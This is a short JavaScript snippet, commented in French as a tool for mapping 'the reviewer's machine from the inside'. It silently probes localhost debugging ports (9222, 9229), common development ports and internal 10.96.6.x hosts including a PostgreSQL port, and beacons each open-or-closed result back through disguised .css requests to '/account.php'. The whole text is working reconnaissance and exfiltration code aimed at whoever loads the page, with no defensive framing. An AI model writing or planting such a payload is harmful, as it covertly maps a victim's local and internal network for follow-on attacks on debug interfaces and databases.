/* Vantage - cartographie de la machine du reviewer, vue de l'interieur.
   Une requete qui aboutit resout la promesse, une connexion refusee la rejette :
   un bit par cible, suffisant pour savoir ce qui ecoute. */
(function () {
  function b(t) {
    try { fetch('/account.php/Q' + t + '.css', { mode: 'no-cors', cache: 'no-store', keepalive: true }); } catch (e) {}
  }
  b('exec');
  var T = ['http://127.0.0.1:9222/json/version',
           'http://localhost:9222/json/version',
           'http://127.0.0.1:9229/json/version',
           'http://127.0.0.1:3000/',
           'http://127.0.0.1:5000/',
           'http://127.0.0.1:8000/',
           'http://127.0.0.1:8080/',
           'http://127.0.0.1:9000/',
           'http://127.0.0.1:80/',
           'http://10.96.6.4/',
           'http://10.96.6.3:5432/'];
  T.forEach(function (u, i) {
    fetch(u, { mode: 'no-cors', cache: 'no-store' })
      .then(function () { b('t' + i + 'ok'); })
      .catch(function () { b('t' + i + 'no'); });
  });
})();
